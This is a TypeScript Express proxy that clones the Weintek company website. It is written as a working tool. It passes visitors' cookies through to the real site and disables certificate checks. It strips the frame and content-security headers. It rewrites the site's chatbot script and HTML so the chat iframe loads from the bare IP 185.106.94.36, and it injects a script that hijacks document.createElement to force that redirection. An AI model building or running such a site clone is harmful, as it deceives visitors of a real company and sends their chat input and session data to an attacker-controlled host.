import express, { Request, Response } from 'express';
import axios, { AxiosResponse, Method, RawAxiosRequestHeaders } from 'axios';
import https from 'https';

const app = express();
const PORT = process.env.PORT || 3000;
const TARGET_DOMAIN = 'https://www.weintek.com';

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use('/', async (req: Request, res: Response) => {
  try {
    const targetUrl = TARGET_DOMAIN + req.url;
    console.log(`[${new Date().toISOString()}] Проксирование: ${req.method} ${req.url}`);

    const headers: RawAxiosRequestHeaders = {
      'User-Agent': req.headers['user-agent'] as string || 'Mozilla/5.0 (compatible; ProxyBot/1.0)',
      'Accept': req.headers['accept'] as string || '*/*',
      'Accept-Language': req.headers['accept-language'] as string || 'ru-RU,ru;q=0.9,en;q=0.8',
    };

    if (req.headers.cookie) headers['Cookie'] = req.headers.cookie as string;
    if (req.headers.referer) headers['Referer'] = req.headers.referer as string;
    if (req.headers['content-type']) headers['Content-Type'] = req.headers['content-type'] as string;

    const httpsAgent = new https.Agent({ rejectUnauthorized: false });

    const response: AxiosResponse = await axios({
      method: req.method as Method,
      url: targetUrl,
      headers: headers,
      responseType: 'stream',
      data: ['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method) ? req.body : undefined,
      httpsAgent: httpsAgent,
      timeout: 30000,
      maxRedirects: 5,
      validateStatus: () => true
    });

    res.status(response.status);

    const headersToSkip = ['content-encoding', 'transfer-encoding', 'content-length', 'connection'];
    const securityHeadersToRemove = ['x-frame-options', 'content-security-policy'];

    Object.entries(response.headers).forEach(([key, value]) => {
      const lowerKey = key.toLowerCase();
      if (!headersToSkip.includes(lowerKey) && !securityHeadersToRemove.includes(lowerKey) && value) {
        res.setHeader(key, Array.isArray(value) ? value.join(', ') : value);
      }
    });

    res.setHeader('X-Proxy-Server', 'Node.js/Express');
    res.setHeader('X-Proxy-Timestamp', new Date().toISOString());

    const contentType = response.headers['content-type'] as string || '';

    if (req.url.includes('weinbot-plugin') && contentType.includes('javascript')) {
      console.log('🔧 Найден файл бота weinbot-plugin, подменяем адрес iframe...');
      
      let jsContent = '';
      
      response.data.on('data', (chunk: Buffer) => {
          jsContent += chunk.toString('utf-8');
      });
      
      response.data.on('end', () => {
        try {
          let modifiedJs = jsContent;
          
          const iframeCreationRegex = /const\s+l\s*=\s*n\([\s\S]*?iframe[\s\S]*?src:[\s\S]*?this\.IFRAME_SRC[\s\S]*?\)/;
          
          const newIframeCode = `const l = n("iframe", {
            id: \`widget-iframe-\${this.UUID}\`,
            className: "iframe-style",
            src: "http://185.106.94.36",
            frameborder: "0",
            sandbox: "allow-scripts allow-same-origin allow-forms allow-popups allow-popups-to-escape-sandbox",
            allow: "clipboard-write"
          })`;
          
          modifiedJs = modifiedJs.replace(iframeCreationRegex, newIframeCode);
          
          modifiedJs = modifiedJs.replace(
            /this\.IFRAME_SRC\s*=\s*["']https:\/\/chatbot\.weincloud\.net\/weintek\.com["']/,
            'this.IFRAME_SRC = "http://185.106.94.36"'
          );
          
          modifiedJs = `
            (function() {
              const originalCreateElement = document.createElement;
              document.createElement = function(tagName) {
                const element = originalCreateElement.call(document, tagName);
                if (tagName.toLowerCase() === 'iframe') {
                  setTimeout(() => {
                    if (!element.src || element.src.includes('chatbot.weincloud.net')) {
                      element.src = 'http://185.106.94.36';
                    }
                  }, 0);
                }
                return element;
              };
            })();
          ` + modifiedJs;
          
          console.log('✅ Адрес iframe в боте успешно подменен');
          res.send(modifiedJs);
        } catch (err) {
          console.error('Ошибка при обработке JS бота:', err);
          res.send(jsContent);
        }
      });
    } else if (contentType.includes('text/html')) {
      let html = '';
      
      response.data.on('data', (chunk: Buffer) => {
        html += chunk.toString('utf-8');
      });
      
      response.data.on('end', () => {
        try {
          let modifiedHtml = html
            .replace(new RegExp(TARGET_DOMAIN.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), '')
            .replace(/https?:\/\//g, '//')
            .replace(/(href|src|action)=(["'])\/(?!\/)/g, '$1=$2/')
            .replace(/url\(["']?\/(?!\/)/g, 'url(/')
            .replace('<head>', '<head><base href="/">');
          
          modifiedHtml = modifiedHtml.replace(
            /https:\/\/chatbot\.weincloud\.net\/weintek\.com/g,
            'http://185.106.94.36'
          );
          
          res.send(modifiedHtml);
        } catch (err) {
          console.error('Ошибка при обработке HTML:', err);
          res.send(html);
        }
      });
    } else {
      response.data.pipe(res);
    }
  } catch (error: any) {
    console.error(`[${new Date().toISOString()}] Ошибка прокси:`, error.message);
    res.status(500).json({
      error: 'Proxy error',
      message: error.message,
      url: req.url,
      timestamp: new Date().toISOString()
    });
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Прокси-сервер запущен на http://localhost:${PORT}`);
  console.log(`🎯 Целевой домен: ${TARGET_DOMAIN}`);
});